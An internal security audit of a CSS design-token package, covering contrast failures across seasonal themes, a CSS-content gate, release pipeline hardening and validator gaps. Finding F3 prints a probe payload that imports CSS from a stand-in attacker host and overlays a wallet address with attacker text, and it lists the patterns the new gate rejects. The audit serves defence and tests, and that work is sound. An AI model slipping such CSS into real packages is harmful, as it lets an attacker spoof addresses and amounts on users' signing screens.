# Security Audit — `design-tokens`

**Classification:** Internal security review (re-verified 2026-10-09, fix wave 2026-10-10 — awaiting external review)
**Project:** design-tokens (`@meddleware/design-tokens`) — the design-token package for every
`@meddleware` UI. It ships:

- `tokens.css`: the palette ramps, the colour-agnostic semantic roles (light and dark), the
  sacred-geometry type and space scales, and the panel palettes;
- the opt-in `seasons.css` (`--season-*` overrides under `[data-season]`);
- a JSON mirror (`tokens.json`) with a TypeScript re-export (`index.ts`).

**Project type:** TS/CSS package; ships source with no build step; published to npm and JSR.
**Template:**

- AUDIT_TEMPLATE.md (2026-10-08)
- AUDIT_TEMPLATE_TS.md (2026-10-08)

Not triggered: SUI, SUI_CLIENT, SEAL, WALRUS, WORKERS, RUST, GO, AUTH, PROXY, OPS, PLATFORM, IMG (no
Dockerfile), SITE. VUE is not triggered either (this is not a Vue app or component library), but its
*Colour & links* row is applied here as the reference for the contrast gate (A3–A5); the
real-browser half of that row is `@meddleware/ui`'s Playwright + axe gate, which runs over every
theme × season.

Two things are assessed against the package's **own** stated invariants (CLAUDE.md, SECURITY.md,
CHANGELOG):

- **Accessibility contrast.** The consumers' VUE-lens audits assume it.
- **CSS supply-chain integrity.** Every UI imports `tokens.css` globally, so it sits on the VUE-M4
  signing-preview path.

**Deployment status:**

- npm `@meddleware/design-tokens` **0.1.9** (published 2026-10-08, `latest`, SLSA v1 provenance
  attestation). Tag `v0.1.9` = `db4e3ad`; `main` HEAD is `61863ad` (2026-10-09, a Dependabot
  minor/patch group for `postcss` and `stylelint`, dev-only, not in the tarball). 7 files, 45.2 kB
  unpacked, 14.2 kB packed.
- JSR `@meddleware/design-tokens` **0.1.9** (verified 2026-10-09 against `api.jsr.io`: 4 versions,
  `latestVersion` 0.1.9, no dependents). The first pass could not reach `api.jsr.io`; the JSR drift
  recorded then (stuck at 0.1.2 until 0.1.8) is closed by `check:versions`.
- **Unreleased (2026-10-10 fix wave): 0.1.10**, committed locally (`commit pending`), not yet tagged or
  published. It resolves F4, F5, F11 and F12 (see each finding and the log). Everything above describes
  the published 0.1.9 unless stated.
- Consumers: 13 workspace packages, all on `^0.1.9` (`@meddleware/ui`, every tool UI, dashboard, landing,
  status-page, walrus-relay, and the docs and dev sites).
- `seasons.css` is imported by the apps, and seasons are **active in production**: `@meddleware/ui`'s
  `useSeason()` sets `data-season` from the calendar month and is called by access-gate-ui, dao-ui,
  dashboard, landing, seal-ui, status-page, token-deployer-ui, treasury-ui and walrus-ui. It is
  *autumn* at this review. Since 0.1.9 every season passes the contrast gate in both themes (F1).

**Review date:** 2026-10-03 (first pass); re-verified 2026-10-09; fix wave 2026-10-10
**Reviewer:** Internal review
**Severity ceiling:** Medium.

- The package has no JavaScript side effects and no network access, and holds no secrets.
- But its CSS is loaded globally, unsandboxed, into every Meddleware UI, including the transaction-
  and signing-preview screens.
- A malicious or mistaken publish could relabel on-screen text (for example `::after { content }`
  over an address or amount), hide warnings, or pull off-origin CSS.
- Separately, its colour roles decide whether status and interactive text meets WCAG AA across all
  apps.
- Realised ceiling after the 2026-10-09 re-verification: **Low** (one open consumer item, F10; at the
  first pass F1–F3 were all open at Low).

**Status:** re-verified 2026-10-09 at `61863ad` (first-pass baseline 2026-10-03 at `097b73d`); fix wave
2026-10-10 (0.1.10, `commit pending`). F1–F3, F6–F8 are resolved in 0.1.9; F4, F5, F11 and F12 are
resolved in 0.1.10; F10 stays deferred (the call sites are in three consumer repos).

**Front matter (TS lens):**

| Field | Value |
| --- | --- |
| Package manager / lockfile | npm; `package-lock.json` committed |
| Module format | ESM (`"type": "module"`) |
| Publish model | ships `src/` as-is (TypeScript source + CSS + JSON). `exports`: `.` (`types` and `default` → `src/index.ts`), `./tokens.css`, `./seasons.css`, `./tokens.json`. `sideEffects: ["*.css"]` |
| Runtime targets | consumers' bundlers (Vite, VitePress); browsers load the CSS. CI and publish run on Node 24 (the only supported Node LTS) |
| Peer dependencies | none |
| Runtime dependencies | none. Dev (locked): `jsr` 0.14.3 (pinned, the publish tool), `stylelint` ^17.16.0, `stylelint-config-standard` ^40.0.0, `postcss` ^8.5.29, `typescript` ~6.0.0 (TypeScript 7 deferred by decision) |

**Location:** `design-tokens/docs/audit/design-tokens-audit.md` (the repo-local audit is canonical).

> **Access note:** the 2026-10-09 re-verification read the local checkout `repos/design-tokens` at
> `61863ad` (clean apart from this untracked `docs/`). Nothing in the repo was changed, committed or
> pushed by the audit.

---

## Executive summary

The package is 617 lines of shipped source at 0.1.9 (`tokens.css` 305, `seasons.css` 130, `index.ts` 142,
`tokens.json` 40) and 663 at 0.1.10 (`index.ts` 174, `tokens.json` 54: the full role mirror and the
remaining named exports). Four Node check scripts (plus a shared `lib/css.mjs`), five test files and two
CI workflows support it. There is no runtime JavaScript beyond static re-exports of the JSON.

The first pass (2026-10-03, `097b73d`, 0.1.8) recorded F1–F8 with every one DEFERRED. Release 0.1.9
(2026-10-08, `db4e3ad`) fixed the contrast and CSS-integrity gaps and the release pipeline; the
2026-10-09 re-verification re-checked every finding against `main` (`61863ad`). The 2026-10-10 fix wave
(0.1.10, unreleased) resolves the four package-side leftovers: F4, F5, F11, F12.

**What holds (verified 2026-10-09):**

- **Shipped CSS is declarations only, and a gate enforces it.** `check:css` asserts both files hold
  only `--*` custom properties and `color-scheme` under the allow-listed selectors, with no at-rule,
  escape, `content` or `url()` beyond the SHA-256-pinned `--noise-overlay` data URI (F3).
- **Every theme × season meets WCAG AA, and a gate enforces it.** `check:contrast` passes 250 pairings
  (2 themes × 5 season states) at 0.1.9 and 370 at 0.1.10 (adding every text role on `--lift` and both
  panel palettes, F11); each season has a light and a dark block (F1), and the light warning text role
  is `--warning-text` (F2).
- **References resolve.** An unresolvable `var()` fails the contrast gate, and `check:sync` keeps the
  season key sets identical and matching what `tokens.css` reads.
- **CI and release.**
  - The tag workflow runs the full CI workflow (`workflow_call`) before publishing, so a tag cannot
    ship what CI refuses.
  - npm and JSR publish in separate jobs, each with its own `id-token: write`, and the JSR CLI is a
    pinned devDependency run with `npx --no-install` (F7).
  - SHA-pinned actions; OIDC publish with npm provenance (0.1.9 verified); an expiring audit
    allowlist; grouped weekly Dependabot for npm and actions; a tarball-contents check.
- **Measured.** At 0.1.9 (2026-10-09): `npm run check` (versions, sync, contrast, CSS contract, 25
  tests), type-check and stylelint clean; the audit gate: 1 high advisory, allowlisted and dev-only;
  `npm audit --omit=dev` clean; pack 7 files, 14.2 kB. At 0.1.10 (2026-10-10): the same checks with 37
  tests (Node and Deno entry import included) and 370 contrast pairings; pack 7 files, 15.3 kB; `jsr
  publish --dry-run` succeeds.

**Findings (none above Low):**

| Finding | State |
| --- | --- |
| F1 seasonal palettes failed AA | RESOLVED 0.1.9 |
| F2 light `--warning` 2.0:1 | RESOLVED in the package (`--warning-text`); three consumer call sites still use `--warning` as text — **F10** |
| F3 CSS-integrity invariants unmechanised | RESOLVED 0.1.9 (`check:css`, 22 payload tests) |
| F4 comment-blind, partial validator | RESOLVED 0.1.10 (comments fixed in 0.1.9; every role mirrored, all subtrees exported, `status` deprecated) |
| F5 JSR / Node entry-point caveats | RESOLVED 0.1.10 (import attribute; entry imported under Node and Deno in CI; JSR dry run; OQ4 decided: JSR kept) |
| F6 global `.dark` | RESOLVED 0.1.9 (`:root.dark`) |
| F7 CI/release details, unpinned `npx jsr` | RESOLVED 0.1.9 (unsigned tags accepted) |
| F8 documentation drift | RESOLVED 0.1.9 for the recorded items; residual drift — **F12** |
| F10 `--warning` still drawn as text in access-gate-ui, dao-ui, treasury-ui | DEFERRED |
| F11 contrast gate omits `--lift` and panels | RESOLVED 0.1.10 (gated; four ramp stops darkened 1–3%) |
| F12 residual documentation drift | RESOLVED 0.1.10 |

**Posture:**

- The two gaps the first pass found were about outcomes the checks did not cover: contrast (F1, F2)
  and CSS content integrity (F3). Both are now gated in CI and before every publish, with tests that
  feed the gates the payloads they exist to catch.
- What remains is consumer-side (F10): three call sites in other repos. The JSR Deno entry (F5), the
  `--lift` / panel gate gap (F11), the partial JSON mirror (F4) and the residual documentation (F12) are
  fixed in 0.1.10, pending release. None was a supply-chain or integrity risk.
- By maintainer instruction the first pass only recorded findings; the fixes landed in 0.1.9 and are
  cited per finding below.

---

## Threat model / trust boundaries

| Actor / source | Controls | Can do | Bounded by |
| --- | --- | --- | --- |
| Token author / maintainer (honest) | values, selectors, roles | Ship low-contrast roles; drift JSON from CSS | `check:contrast` (every theme × season, F1/F2); `check:sync` (consistency); stylelint; all run in CI and before publish. `--lift` and the panels are inside the gate from 0.1.10 (F11) |
| Compromised maintainer account, CI step or dependency at publish | the published tarball | Ship CSS that relabels or hides UI text in every app, or loads off-origin CSS | `check:css` (F3) in CI and publish `verify`; OIDC + provenance; consumers' lockfiles; the JSR CLI is a lockfile-pinned devDependency and the two publish jobs hold separate `id-token` scopes (F7). The `v*` tag is lightweight and unsigned (F7, accepted) |
| Consumer apps | which files they import; `data-theme`, `data-season`, `:root.dark` | Activate seasons (all nine call sites do, via `useSeason`) | Per-theme season blocks and the contrast gate (F1); `.dark` honoured on the root element only (F6). Consumers that draw `--warning` as text (F10) |
| JS / tooling consumers | `import { semantic, … }` | Read role values | `check:sync` forward check; every colour role is mirrored from 0.1.10 and `status` is deprecated (F4) — no workspace consumer imports the JS API |
| Browser CSP of consumers | loads | Block the `data:` texture | Consumer CSPs allow `img-src data:` |

### Supply chain & input matrix (TS lens)

| Actor / source | Controls | Bounded by |
| --- | --- | --- |
| Dependency authors | dev only: stylelint (→ micromatch → braces: GHSA-vfj7-8cjw-p6xm, high, allowlisted to 2027-01-01), postcss, typescript, `jsr` 0.14.3 (the publish CLI) | lockfile + `npm ci`; audit gate in CI and in publish `verify`; `jsr` pinned in the lockfile (F7) |
| Registry (npm, JSR) | the tarball served for a version | npm provenance attestation (0.1.9); lockfiles of consumers |
| Untrusted inputs | none at runtime (static CSS/JSON) | — |
| Embedding host | global CSS scope | F3 |

---

## Severity scale

Critical / High / Medium / Low / Info / Positive.

## Scope

**In scope (`61863ad` on `main`; release tag `v0.1.9` = `db4e3ad`; the first pass read `097b73d` = `v0.1.8`):**

- `src/{tokens.css,seasons.css,tokens.json,index.ts}`
- `scripts/{check-token-sync,check-contrast,check-css-contract,check-versions}.mjs`, `scripts/lib/css.mjs`
- `tests/{check-css-contract,sync-comments}.test.mjs`
- `.github/{audit-gate.mjs,audit-allowlist.json,dependabot.yml}`, `.github/workflows/{node-ci,npm-publish}.yml`
- `package.json`, `package-lock.json`, `jsr.json`, `tsconfig.json`, `stylelint.config.js`
- `README.md`, `CLAUDE.md`, `AGENTS.md`, `SECURITY.md`, `CHANGELOG.md`, `LICENSE`

**Cross-repo evidence (read-only, local clones):**

- `ui/src/composables/useSeason.ts`, `ui/e2e/contrast.spec.ts` and `ui/CHANGELOG.md` 0.1.31 (the
  real-browser axe gate over every theme × season);
- consumers' `main.ts` (`useSeason()` calls) and `package.json` ranges;
- `--warning` and `--warning-text` usages across the consumers' `src/`;
- the registries: `registry.npmjs.org` and `api.jsr.io` (public, read-only).

**2026-10-10 fix wave (0.1.10):** the same files plus `tests/{check-contrast,sync-mirror,entry-import}.test.mjs`
and the changed `jsr.json` (`publish.include`) and `node-ci.yml` (Deno, JSR dry run).

**Out of scope:** the components' own contrast (ui audit); the docs and dev sites' VitePress
theming.

**Environment / commands (2026-10-09, Node 24.13.0, existing `node_modules`):**

| Command | Result |
| --- | --- |
| `npm run check` | clean: `check:versions` ✓ (0.1.9), `check:sync` ✓, `check:contrast` ✓ (250 pairings, 2 themes × 5 seasons), `check:css` ✓, `npm test` 25 pass / 0 fail |
| `npm run type-check` / `npm run lint` | clean / clean |
| `node .github/audit-gate.mjs` | 1 high/critical (GHSA-vfj7-8cjw-p6xm, braces via stylelint → micromatch), 0 not allowlisted |
| `npm audit --omit=dev` | 0 vulnerabilities |
| `npm pack --dry-run` | 7 files, 14.2 kB packed / 45.2 kB unpacked |
| `registry.npmjs.org` | `latest` 0.1.9, published 2026-10-08; `dist.attestations` SLSA v1 provenance |
| `api.jsr.io` | package has 4 versions, `latestVersion` 0.1.9, `GET …/versions/0.1.9` 200, 0 dependents |
| Deno 2.9.6 (scratch dir, via the `deno` npm package; deleted afterwards) | `deno check index.ts` passes; `deno run` of `index.ts` **fails**: the JSON import has no `with { type: "json" }` attribute (F5) |
| `git cat-file -t v0.1.9` | `commit` (lightweight tag) |
| Contrast cross-check (scratch script, deleted afterwards) | `--lift` as the background of the text roles: 10 light-theme pairings at 4.30–4.49:1 (F11); all 20 panel-palette pairings pass |
| Installed `node_modules` | predate the 2026-10-09 Dependabot bump (`stylelint` 17.15.0, `postcss` 8.5.28 installed; the lockfile has 17.16.0 and 8.5.29). The checks above ran on that install; CI runs `npm ci` from the lockfile and was not re-run by this audit |

No repo files were modified by the 2026-10-09 pass. The 2026-10-10 fix wave ran on Node 24.13.0, Deno 2.9.6
(scratch install of the `deno` npm package) and `jsr` 0.14.3; see the log.

---

## Findings

### F1 — The seasonal palettes fail WCAG AA in both themes, and seasons are on in production

**Severity:** Low (accessibility; affects every app that calls `useSeason`)   **Disposition:**
RESOLVED (0.1.9, `db4e3ad`)
**Where:** `src/seasons.css:33-79`; header comment `:22-26` ("Values are mid-tone ramp stops chosen
to read on both canvases"); `src/tokens.css:242-259, 284-297` (the season-first roles, including the
`-contrast` pairs); `ui/src/composables/useSeason.ts` (sets `data-season` from the month);
`useSeason()` called in access-gate-ui, dao-ui, dashboard, landing and seal-ui.

**Issue — computed failures (AA: 4.5:1 text, 3:1 non-text):**

| Season · theme | Pairing | Ratio |
| --- | --- | --- |
| **autumn** (active 2026-09 → 11) · light & dark | `--accent-contrast` `#fff` on `--accent` `#e06d10` (button label) | **3.30** |
| autumn · light | `--accent` `#e06d10` as text on `--bg` / `--surface` | **3.01 / 3.30** |
| autumn · light | `--secondary` `#d92d20` on `--bg`; `--primary` `#a65e2e` on `--bg` | 4.41; 4.50 (borderline) |
| autumn · dark | `--primary` `#a65e2e` / `--secondary` `#d92d20` as text | 3.62–3.97 |
| spring · light & dark | `--accent-contrast` `#fff` on `--accent` `#1f9254` | **3.96** |
| spring · light | `--accent` `#1f9254` as text | 3.62 / 3.96 |
| spring · dark | `--primary` `#2b7a56` / `--secondary` `#1d6fe0` as text | 3.42–4.02 |
| summer · light | `--accent` `#1d6fe0`, `--secondary` `#d92d20` on `--bg` | 4.35, 4.41 |
| summer · dark | `--accent` `#1d6fe0`, `--primary` `#2b7a56`, `--secondary` `#d92d20` as text | 3.42–4.02 |
| **winter · dark** | `--accent` `#1558b5` as text | **2.63–2.82** |
| **winter · dark** | `--primary` `#3b4879` as text | **2.03–2.18** |
| winter · dark | `--secondary` `#177542` as text | 3.11–3.34 |
| **winter · light** | `--focus-ring` `#6ea8fe` on `--bg` / `--surface` (non-text, 3:1) | **2.20 / 2.42** |

- **Summer focus ring.** It is `--mw-red-500`, the same hue family as `--danger`. That contradicts
  `tokens.css:258` ("slate, so it never reads as error") and CLAUDE.md ("Focus uses `--focus-ring` …
  so focus never reads as an error").
- **The cause.** The seasons override the accent roles with one value for **both** themes; there is
  no `[data-theme="dark"][data-season=…]` variant. A mid-tone cannot satisfy 4.5:1 against both a
  near-white and a near-black canvas, and the `-contrast` pairs are hard-coded to `#fff`.
- The default (no-season) palette passes every role pairing except F2.

**Impact:**

- From September to November every app using `useSeason` renders primary buttons with 3.3:1 label
  contrast and accent links at about 3:1 on light. In winter, dark-mode links and primary text drop
  to about 2–2.8:1, and the light-mode focus ring becomes nearly invisible.
- These are WCAG 1.4.3 / 1.4.11 failures across the product. Consumers' a11y tests (axe in ui) run
  without a season, so they cannot catch them.

**Remediation / evidence:**

- Give each season per-theme values, e.g. `:root[data-season="autumn"]` for light and
  `:root[data-theme="dark"][data-season="autumn"], .dark[data-season="autumn"]` for dark.
- Choose stops that meet 4.5:1 for text and for the `-contrast` label. Computed candidates:
  - autumn light accent `--mw-orange-600` `#b0530c`: 4.69 on `--bg`, 5.14 white label;
  - winter dark accent `--mw-blue-300`;
  - winter light focus `--mw-blue-600`.
- Keep focus in the slate or blue family in every season.
- Add a contrast gate to CI (S1) covering every theme × season.
- Until fixed, consider not calling `useSeason()` in apps (a one-line opt-out per app).

**Re-verified 2026-10-09 — RESOLVED.** Fixed in 0.1.9 (`db4e3ad`; CHANGELOG 0.1.9 "Fixed").

- **Per-theme season blocks.** `src/seasons.css` (79 → 130 lines) now carries two blocks per season:
  `:root[data-season="…"]` (darker stops, white labels) and
  `:root[data-theme="dark"][data-season="…"], :root.dark[data-season="…"]` (lighter stops, dark labels).
  New ramp stops `--mw-copper-400`, `--mw-copper-600`, `--mw-yellow-700` (`tokens.css:68, 115, 117`).
  Autumn light accent is `--mw-orange-600` (the first pass's candidate); the summer and winter focus
  rings are slate/blue (`seasons.css:69, 81, 93, 105, 117, 129`), never red. The `seasons.css` header
  comment states the two-block design.
- **Gate.** `scripts/check-contrast.mjs` (`npm run check:contrast`) evaluates the browser cascade
  (`scripts/lib/css.mjs`: specificity and source order, seasons composed with dark) for 2 themes × 5
  season states and asserts 4.5:1 for nine text roles on `--bg` and `--surface`, 4.5:1 for the five
  `-contrast` label pairs, and 3:1 plus "not red" for `--focus-ring`. It passes 250 pairings today. It
  runs in node-ci and, through `workflow_call`, in the publish `verify` job (F7). Sync also still
  checks the season key sets (A2).
- **Consumer side.** `@meddleware/ui` 0.1.31 adds a Playwright + axe gate (`ui/e2e/contrast.spec.ts`)
  over a component gallery across every theme × season, so the downstream half is measured in a real
  browser as the VUE *Colour & links* row requires (see the `ui` audit).
- **OQ1.** Seasons stay enabled: nine apps still call `useSeason()` and, with the gate green, the
  opt-out is no longer needed (Decided by the 0.1.9 release; see OQ1).
- **Gap left.** The gate does not measure `--lift` or the panel palettes (F11).

### F2 — Light-theme `--warning` is 2.0:1 and is used as text colour

**Severity:** Low   **Disposition:** RESOLVED in this package (0.1.9, `db4e3ad`); the consumer
call sites that remain are tracked as F10
**Where:** `src/tokens.css:251` (`--warning: var(--mw-yellow-500)` = `#e0a500`); CLAUDE.md "status
roles (`--danger`, `--warning`, `--ok`, `--info`) … must keep ≥ 4.5:1 on that theme's `--bg` and
`--surface`"; CHANGELOG 0.1.8 "status roles are theme-aware and meet WCAG AA".

**Issue:**

- `#e0a500` on `--bg` `#f7f4f1` = **2.01:1**; on `--surface` `#fff` = **2.20:1**.
- The other light status roles pass (`--danger` 5.97, `--ok` 5.24, `--info` 6.19 on `--bg`), as do all four in
  dark.
- `--warning` is used as **foreground text** in shipped UIs:
  - access-gate-ui `GateCard.vue:112` (`color: var(--warning)`);
  - dao-ui and treasury-ui `styles/qt.css:172` (on a 10% warning tint);
  - ui `UiBadge.vue:33` (on a 20% tint).
- The `--warning-contrast` pair (dark text on a solid warning background) is fine, but that is not
  how these call sites use it.

**Impact:** warning text ("degraded", "paused", caution badges) is effectively unreadable for
low-vision users in light mode across the dashboard and tool UIs. The invariant and the release note
claim otherwise.

**Remediation / evidence:**

- Add a text-safe warning role (e.g. `--warning-text` = `#8a6500`: 4.86 on `--bg`, 5.33 on
  `--surface`), or retune `--warning` itself to a ≥ 4.5:1 stop and keep the bright yellow for fills
  under a `--warning-fill` role.
- Update the consumers to use the text role for `color:`.
- Correct the CHANGELOG claim.
- Covered by S1.

**Re-verified 2026-10-09 — RESOLVED (package scope).** Fixed in 0.1.9 (`db4e3ad`).

- **Role.** `--warning-text` is a text-safe warning role: `--mw-yellow-700` `#8a6500` on light (4.86:1
  on `--bg`), `--mw-yellow-300` on dark (`tokens.css:258, 300`). `--warning` stays the bright fill
  (2.0:1 on the light canvas) and `README.md` and `CLAUDE.md` now say so ("status text uses
  `--warning-text`, never `--warning`"). This is the first pass's OQ2 option (b).
- **Gate.** `warning-text` is one of the nine text roles `check:contrast` measures in every theme ×
  season; the `--warning-contrast` label on `--warning` is one of the label pairs.
- **CHANGELOG.** 0.1.9 states the 0.1.8 claim "was true of every role except light `--warning`".
- **Consumers.** `@meddleware/ui` (`UiBadge.vue:33`) and wallet-adapter (`WalletSelector.vue:88`) use
  `--warning-text`. access-gate-ui, dao-ui and treasury-ui do not yet (F10).

### F3 — The CSS-integrity invariants in SECURITY.md are not mechanised

**Severity:** Low (latent; Medium-class impact if a malicious publish occurred)
**Disposition:** RESOLVED (0.1.9, `db4e3ad`)
**Where:** `SECURITY.md:5-9, 16-17` (invariant 1 "`tokens.css` contains no `@import`, `url()`, or
`http(s):` reference — only custom-property declarations"; scope names `tokens.css`, `tokens.json`
and `index.ts` but not `seasons.css`); `scripts/check-token-sync.mjs` (value consistency only);
`npm-publish.yml:17-34` (verify runs no stylelint).

**Issue:**

- **Probe.** Appending to a scratch copy of `tokens.css`:

  ```css
  @import url("https://evil.example/x.css");
  :root { --text: #201b19; }
  .wallet-address::after { content: "0xattacker"; }
  ```

  then running `check:sync` printed **"✓ design-token sync check passed"**.
- stylelint reported 2 errors, but only for the duplicate `:root` selector and `@import` position.
  A payload placed at the top of the file, or a lone `::after` rule, raises nothing.
- stylelint runs in Node CI with `--if-present`, and **not** in the publish `verify` job.
- **Invariant 1 is already untrue as written.** `--noise-overlay` is a `url("data:image/svg+xml,…")`
  that contains the string `http://www.w3.org/2000/svg`. It is a harmless inline namespace, not a
  load, but a literal check would fail.
- `seasons.css`, which is also imported globally by consumers, is outside the policy's scope.

**Impact:**

- Every Meddleware UI imports `tokens.css` (and several import `seasons.css`) as global, unscoped
  CSS.
- A compromised publish could therefore:
  - overwrite displayed text with `content:`, for example over a recipient address or amount on a
    signing preview (VUE-M4);
  - hide warnings;
  - exfiltrate through attribute selectors and `url()`.
- Nothing in this repository's CI or publish path would notice.
- Provenance proves *where* the tarball was built, not *what* it contains.

**Remediation / evidence:** add `scripts/check-css-contract.mjs` to CI **and** to publish `verify`.
It should assert, for both CSS files:

1. selectors are only `:root`, `:root[data-theme="dark"]`, `.dark` and
   `:root[data-season="spring|summer|autumn|winter"]`;
2. declarations are only `--*` custom properties and `color-scheme`;
3. there is no at-rule;
4. the only `url(` is the `--noise-overlay` value, pinned by SHA-256;
5. no `content`, `expression`, `@import`, `\` escapes or `/*!`.

Update SECURITY.md to name both CSS files and to state the `data:` exception precisely.

**Re-verified 2026-10-09 — RESOLVED.** Fixed in 0.1.9 (`db4e3ad`; CHANGELOG 0.1.9 "Added").

- **Gate.** `scripts/check-css-contract.mjs` (`npm run check:css`) checks both `tokens.css` and
  `seasons.css`: selectors only `:root`, `:root[data-theme="dark"]`, `:root.dark` and the four season
  forms (each also with the dark selectors); only `--*` and `color-scheme` declarations; no at-rule,
  backslash escape, `/*!` comment, `expression(`, `javascript:`; no text outside flat blocks; and the
  only `url(` is `--noise-overlay`, whose value is pinned by SHA-256 (`651aa541…19cc3`).
- **Where it runs.** node-ci and, through `workflow_call`, the publish `verify` job (F7), so a publish
  cannot skip it.
- **Tests.** `tests/check-css-contract.test.mjs` feeds the gate the payloads this finding probed with:
  `@import`, a `content` rule on a page selector, a stray non-custom-property declaration, a lone
  `::after` rule at the top of the file, an attribute selector, an unknown season, a `url()` outside
  `--noise-overlay`, a changed overlay, a `/*!` comment, a backslash escape and nesting, each against
  both files (22 rejection cases plus "the shipped files pass"). All pass.
- **SECURITY.md** is rewritten: invariant 1 names both files, lists the selectors, states the `data:`
  SVG exception (its `http://www.w3.org/2000/svg` is an XML namespace, not a load) and the pin, and
  names `npm run check:css` as the enforcement.

### F4 — The sync validator is comment-blind and covers only part of the role surface

**Severity:** Info   **Disposition:** RESOLVED (comment blindness in 0.1.9; the partial mirror,
missing exports and the `status.ok` mismatch in 0.1.10, `commit pending`)
**Where:** `scripts/check-token-sync.mjs:36-58, 136-138, 171-176, 188-196`; `src/tokens.json`;
`src/index.ts`.

**Issue / Impact:**

- **Comments are parsed as declarations (probe).** `parseDecls` and `blockFor` run their regexes
  over raw text, comments included.
  - A comment `/* --text: #ff00ff; (old value) */` inside `:root` was read as the live `--text`
    (last-wins), and the check failed with false drift.
  - The reverse ordering would give a **false pass**: a wrong live value followed by a comment
    holding the right one.
- **Partial role coverage.** `tokens.json` `semantic` mirrors 8 of 20 roles. Missing:
  `lift`, `accent-contrast`, `primary-contrast`, `secondary-contrast`, `danger`, `warning`, `ok`,
  `info`, `highlight`, `warning-contrast`, `highlight-contrast`, `focus-ring`.
  - JS and tooling consumers cannot read the status or focus roles.
  - `status.ok` maps to the legacy `--mw-ok-500` `#1c5e4a`, while the `--ok` role is
    `--mw-green-600` `#177542`. A consumer reading `status.ok` gets a different green from the CSS.
  - The check passes because it maps `status.*` to `--mw-*-500` ramps.
- **Exports.** `secondary`, `status` and `radius` are not named exports, only reachable through
  `designTokens` or `default`. The validator's export check omits them.
- **No contrast or reference checks.** Neither contrast (F1, F2) nor reference resolution is
  checked. References resolve today (verified by a scratch check).
- No current workspace package imports the JS exports, so the impact today is limited to future
  tooling and documentation.

**Remediation / evidence:**

- Strip comments before parsing.
- Mirror every semantic role per theme, and rename `status` to the role values (or remove it).
- Export the remaining subtrees by name.
- Add reference-resolution and contrast checks (S1).

**Re-verified 2026-10-09 — MITIGATED.**

- **Comments — RESOLVED** (0.1.9, `db4e3ad`). `check-token-sync.mjs` now strips comments before
  parsing (`stripComments`, shared in `scripts/lib/css.mjs`). `tests/sync-comments.test.mjs` pins both
  directions: a stale commented-out `--bg` is not read as live (no false failure), and a commented-out
  correct value does not mask a wrong live one (no false pass).
- **References and contrast — RESOLVED.** `check:contrast` fails when a role pairing does not resolve
  to a hex colour, and measures every pairing (F1, F2), so an unresolved `var()` or a low-contrast
  value cannot pass.
- **Partial role mirror — ACCEPTED-RISK.** `tokens.json` `semantic` still mirrors 8 roles per theme
  (now 21 roles exist with `--warning-text`), and `status.ok` (`#1c5e4a`) still differs from `--ok`
  (`#177542`). Reason: the JSON is a documented curated snapshot of no-season resolved values
  (`CLAUDE.md`: "Keep `tokens.json` a flat, human-readable snapshot"); no workspace package imports
  the JS exports (grep of every `src/` and config, 2026-10-09), and CSS is the authority. Revisit if
  tooling starts to read the JSON (S4 `roles.json`).
- **Exports.** `secondary`, `status` and `radius` are still reachable only through `designTokens` or
  the default export; same reasoning.

**Re-evaluated 2026-10-10 — RESOLVED in 0.1.10 (`commit pending`).** The two accepted limitations became
cheap once the sync check already resolved every role, so they were fixed rather than carried:

- **Full role mirror.** `tokens.json` `semantic.light` and `semantic.dark` now hold all 21 colour roles
  (added `lift`, the three `-contrast` labels, `danger`, `warning`, `ok`, `info`, `highlight`,
  `warning-text`, `warning-contrast`, `highlight-contrast`, `focus-ring`). The existing forward check
  verifies each value against the CSS, and a new check (`COLOUR_ROLES` in `check-token-sync.mjs`) fails
  when a role is missing, so a future role cannot be silently left out. Pinned by
  `tests/sync-mirror.test.mjs` (a drifted `ok`, a deleted `lift`).
- **Named exports.** `index.ts` exports `secondary`, `status` and `radius`; the sync check requires every
  `tokens.json` subtree to have an `export const`, and the test removes one to prove it fails.
- **`status.ok`.** The key and value are unchanged (public names are stable, `^0.1.9`): `status` mirrors
  the legacy `--mw-danger-500` / `--mw-ok-500` ramp stops, not the roles. It is marked `@deprecated` in
  TSDoc and the README, pointing at `semantic.*.ok` / `.danger`, which now carry the role values.
  Re-deriving `status.ok` from `--ok` would silently change a published value for nothing that reads it.

### F5 — JSR and Node entry-point caveats

**Severity:** Info   **Disposition:** RESOLVED (0.1.10, `commit pending`; OQ4 decided: JSR is kept)
**Where:** `src/index.ts:39` (`import tokens from './tokens.json'` without `with { type: 'json' }`);
`jsr.json` (exports `.` and `./tokens.json` only); `package.json` `exports["."]` → `.ts` source.

**Issue / Impact:**

- **Deno / JSR.** Deno requires an import attribute for JSON modules, so the `.` entry is expected
  to fail to import under Deno, or to be rejected by `jsr publish`. Neither was verified here; with
  JSR stuck at 0.1.2 until 0.1.8, it may never have been exercised.
- **CSS not on JSR.** JSR cannot export CSS, so JSR users get no `tokens.css` or `seasons.css`.
- **Node.** Node refuses type stripping for files under `node_modules`, so the npm `.` entry works
  only through a bundler or a TS loader. It is documented as "consumers' bundlers handle processing".
- **Consumer `tsc`.** `types` points at the `.ts` source, so consumers' `tsc` compiles it under
  their own flags (`resolveJsonModule` needed). B.TS-1 asks this to be checked under consumer
  settings.

**Remediation / evidence:**

- Use `import tokens from './tokens.json' with { type: 'json' }`. TS 6 and Vite support it.
- Run `deno check` or `npx jsr publish --dry-run` in CI.
- Document the JSR scope (JSON/TS only).
- Optionally ship a generated `.d.ts`.

**Re-verified 2026-10-09 — DEFERRED (now verified).**

- **JSR state.** `api.jsr.io` is reachable this time: the package has 4 versions, `latestVersion` is
  0.1.9 (created 2026-10-08, the same day as npm 0.1.9) and nothing depends on it. The first pass's
  JSR drift is closed (`check:versions`, F9).
- **Deno import — confirmed failing.** In a scratch directory, Deno 2.9.6 `check index.ts` passes but
  `run` of `index.ts` fails with "Expected a JavaScript or TypeScript module, but identified a Json
  module" at `src/index.ts:39`. So the JSR/Deno entry `.` is published but cannot be imported at
  runtime; `src/index.ts:39` is unchanged (`import tokens from './tokens.json'`, no attribute). JSR
  `./tokens.json` is unaffected.
- **Fix.** `import tokens from './tokens.json' with { type: 'json' }` (TS 6 and Vite support it);
  then add `deno run`/`jsr publish --dry-run` to CI. Not applied: the audit makes no code changes.
- **Why deferred.** Whether JSR is a supported distribution is OQ4 (CSS cannot be exported there,
  and nothing depends on the package). The gate is the pre-mainnet "JSR entry verified" item (D).
- **Node and consumer `tsc`.** Unchanged and documented ("consumers' bundlers handle processing");
  `package.json` `exports` and `files` are as before (B.TS-1).

**Fixed 2026-10-10 — RESOLVED in 0.1.10 (`commit pending`); OQ4 decided: JSR is kept.**

